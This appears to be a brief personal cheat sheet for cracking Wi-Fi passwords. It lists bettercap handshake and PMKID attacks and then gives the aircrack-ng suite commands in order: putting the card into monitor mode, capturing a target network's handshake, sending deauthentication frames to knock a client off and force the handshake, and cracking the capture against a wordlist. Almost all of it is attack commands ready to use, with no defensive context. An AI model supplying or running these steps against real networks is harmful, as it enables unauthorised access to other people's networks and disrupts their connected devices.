### bettercap
- handshake
- pmkid attack

Relies on bad password policy

### air suite
#airmon-ng check kill
#airmon-ng start wlan0
#airodump-ng wlan0mon
(lower PWR number = closer to accesspoint)
#airodump-ng -c <channel> --bssid <bssid> -w capture <wlan_interface>
[wait for handshake to be captured]

Speed up the handshake capturing
aireplay-ng -0 1 -a <mac bssid> -c <mac_station> wlan0mon

aircrack-ng -w wordlist.txt -b <mac_bssid> <capturefile.cap>